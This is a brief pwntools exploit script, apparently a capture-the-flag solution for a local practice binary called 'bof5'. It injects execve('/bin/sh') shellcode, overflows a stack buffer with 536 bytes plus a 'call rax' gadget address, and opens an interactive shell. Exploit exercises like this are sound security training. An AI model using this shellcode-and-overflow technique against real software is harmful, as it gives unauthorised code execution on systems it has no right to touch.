from pwn import *

r = process("./bof5")

shellcode = asm(
    '''
    mov rax, 0x3b
    mov rdi, 29400045130965551
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall
    ''', arch='amd64')

call_rax = 0x0000000000401014
r.sendafter('> ', shellcode)
r.sendafter('> ', b'a'*536 + p64(call_rax))

r.interactive()